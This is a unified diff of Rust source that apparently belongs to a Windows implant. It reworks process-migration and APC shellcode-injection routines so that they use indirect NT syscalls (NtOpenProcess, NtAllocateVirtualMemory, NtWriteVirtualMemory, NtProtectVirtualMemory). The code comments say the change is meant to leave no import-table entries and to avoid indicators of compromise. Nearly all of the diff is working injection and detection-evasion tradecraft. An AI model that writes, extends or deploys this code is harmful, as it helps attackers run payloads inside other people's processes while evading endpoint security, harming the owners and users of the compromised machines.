@@ -1240,7 +1240,6 @@ fn aarch64_load_64(insts: &mut Vec<u32>, rd: u32, val: u64) {
 
 #[cfg(windows)]
 pub fn migrate_to_process(target_pid: u32) -> Result<()> {
-    use winapi::um::processthreadsapi::OpenProcess;
     use winapi::um::winnt::{
         PROCESS_CREATE_THREAD, PROCESS_VM_OPERATION, PROCESS_VM_READ, PROCESS_VM_WRITE,
     };
@@ -1253,13 +1252,29 @@ pub fn migrate_to_process(target_pid: u32) -> Result<()> {
     })?;
 
     let access = PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_CREATE_THREAD;
-    let process = unsafe { OpenProcess(access, 0, target_pid) };
-    if process.is_null() {
-        anyhow::bail!(
-            "OpenProcess(pid={target_pid}) failed: {}",
-            std::io::Error::last_os_error()
+
+    // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
+    let process = unsafe {
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut client_id = [0u64; 2];
+        client_id[0] = target_pid as u64;
+        let mut h_proc: usize = 0;
+        let status = syscall!(
+            "NtOpenProcess",
+            &mut h_proc as *mut _ as u64,
+            access as u64,
+            &mut obj_attr as *mut _ as u64,
+            client_id.as_mut_ptr() as u64,
         );
-    }
+        if status.is_err() || status.unwrap() < 0 || h_proc == 0 {
+            anyhow::bail!(
+                "NtOpenProcess(pid={target_pid}) failed: status={:?}",
+                status
+            );
+        }
+        h_proc as *mut _
+    };
 
     let result = hollowing::inject_into_process(target_pid, &payload);
     unsafe { pe_resolve::close_handle(process) };
@@ -1349,8 +1364,7 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     //     that thread next enters an alertable wait state).
     // The original implementation incorrectly spawned a *new* svchost.exe
     // instead of injecting into the supplied `pid`.
-    use winapi::um::memoryapi::{VirtualAllocEx, VirtualProtectEx, WriteProcessMemory};
-    use winapi::um::processthreadsapi::{OpenProcess, OpenThread, QueueUserAPC};
+    use winapi::um::processthreadsapi::{OpenThread, QueueUserAPC};
     use winapi::um::tlhelp32::{
         CreateToolhelp32Snapshot, Thread32First, Thread32Next, TH32CS_SNAPTHREAD, THREADENTRY32,
     };
@@ -1360,66 +1374,89 @@ pub fn apc_inject(pid: u32, payload: &[u8]) -> anyhow::Result<()> {
     };
 
     unsafe {
-        let hprocess = OpenProcess(PROCESS_VM_OPERATION | PROCESS_VM_WRITE, 0, pid);
-        if hprocess.is_null() {
-            return Err(anyhow::anyhow!(
-                "apc_inject: OpenProcess(pid={}) failed: {}",
-                pid,
-                std::io::Error::last_os_error()
-            ));
-        }
-
-        // Allocate RW first; switch to RX after writing to avoid RWX pages (IoC avoidance).
-        let remote_mem = VirtualAllocEx(
-            hprocess,
-            std::ptr::null_mut(),
-            payload.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_READWRITE,
+        // OpenProcess → NtOpenProcess (indirect syscall, no IAT entry)
+        let mut obj_attr: winapi::shared::ntdef::OBJECT_ATTRIBUTES = std::mem::zeroed();
+        obj_attr.Length = std::mem::size_of::<winapi::shared::ntdef::OBJECT_ATTRIBUTES>() as u32;
+        let mut client_id = [0u64; 2];
+        client_id[0] = pid as u64;
+        let mut hprocess: usize = 0;
+        let open_status = syscall!(
+            "NtOpenProcess",
+            &mut hprocess as *mut _ as u64,
+            (PROCESS_VM_OPERATION | PROCESS_VM_WRITE) as u64,
+            &mut obj_attr as *mut _ as u64,
+            client_id.as_mut_ptr() as u64,
         );
-        if remote_mem.is_null() {
-            pe_resolve::close_handle(hprocess);
+        if open_status.is_err() || open_status.unwrap() < 0 || hprocess == 0 {
             return Err(anyhow::anyhow!(
-                "apc_inject: VirtualAllocEx(pid={}) failed",
-                pid
+                "apc_inject: NtOpenProcess(pid={}) failed: status={:?}",
+                pid, open_status
             ));
         }
 
-        let mut written = 0usize;
-        if WriteProcessMemory(
-            hprocess,
-            remote_mem,
-            payload.as_ptr() as _,
-            payload.len(),
-            &mut written,
-        ) == 0
-        {
-            pe_resolve::close_handle(hprocess);
+        // VirtualAllocEx → NtAllocateVirtualMemory (indirect syscall, no IAT entry)
+        // Allocate RW first; switch to RX after writing to avoid RWX pages (IoC avoidance).
+        let mut base_addr: usize = 0;
+        let mut region_size: usize = payload.len();
+        let alloc_status = syscall!(
+            "NtAllocateVirtualMemory",
+            hprocess as u64,                            // ProcessHandle
+            &mut base_addr as *mut _ as u64,           // BaseAddress (in/out)
+            0u64,                                       // ZeroBits
+            &mut region_size as *mut _ as u64,          // RegionSize (in/out)
+            (MEM_COMMIT | MEM_RESERVE) as u64,          // AllocationType
+            PAGE_READWRITE as u64,                       // Protect
+        );
+        if alloc_status.is_err() || alloc_status.unwrap() < 0 || base_addr == 0 {
+            let _ = syscall!("NtClose", hprocess as u64);
             return Err(anyhow::anyhow!(
-                "apc_inject: WriteProcessMemory(pid={}) failed",
-                pid
+                "apc_inject: NtAllocateVirtualMemory(pid={}) failed: status={:?}",
+                pid, alloc_status
+            ));
+        }
+        let remote_mem = base_addr as *mut std::ffi::c_void;
+
+        // WriteProcessMemory → NtWriteVirtualMemory (indirect syscall, no IAT entry)
+        let mut bytes_written: usize = 0;
+        let write_status = syscall!(
+            "NtWriteVirtualMemory",
+            hprocess as u64,                            // ProcessHandle
+            remote_mem as u64,                          // BaseAddress
+            payload.as_ptr() as u64,                   // Buffer
+            payload.len() as u64,                       // NumberOfBytesToWrite
+            &mut bytes_written as *mut _ as u64,        // NumberOfBytesWritten
+        );
+        if write_status.is_err() || write_status.unwrap() < 0 {
+            let _ = syscall!("NtClose", hprocess as u64);
+            return Err(anyhow::anyhow!(
+                "apc_inject: NtWriteVirtualMemory(pid={}) failed: status={:?}",
+                pid, write_status
             ));
         }
 
+        // VirtualProtectEx → NtProtectVirtualMemory (indirect syscall, no IAT entry)
         // Flip from RW to RX — no write permission at execution time.
-        let mut old_protect = 0u32;
-        if VirtualProtectEx(
-            hprocess,
-            remote_mem,
-            payload.len(),
-            PAGE_EXECUTE_READ,
-            &mut old_protect,
-        ) == 0
-        {
+        let mut protect_base: usize = base_addr;
+        let mut protect_size: usize = payload.len();
+        let mut old_protect: u32 = 0;
+        let protect_status = syscall!(
+            "NtProtectVirtualMemory",
+            hprocess as u64,                            // ProcessHandle
+            &mut protect_base as *mut _ as u64,         // BaseAddress (in/out)
+            &mut protect_size as *mut _ as u64,         // RegionSize (in/out)
+            PAGE_EXECUTE_READ as u64,                    // NewProtect
+            &mut old_protect as *mut _ as u64,           // OldProtect
+        );
+        if protect_status.is_err() || protect_status.unwrap() < 0 {
             log::warn!(
-                "apc_inject: VirtualProtectEx to RX failed for pid={}, memory remains RW (not executable)",
-                pid
+                "apc_inject: NtProtectVirtualMemory to RX failed for pid={}, memory remains RW (not executable): status={:?}",
+                pid, protect_status
             );
             // Continue anyway — the payload won't execute if the page isn't
             // executable, but at least we don't leak RWX pages.  The APC
             // simply won't fire successfully.
         }
-        pe_resolve::close_handle(hprocess);
+        let _ = syscall!("NtClose", hprocess as u64);
 
         // Snapshot all threads in the system, filter by owner pid, queue APC.
         let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);
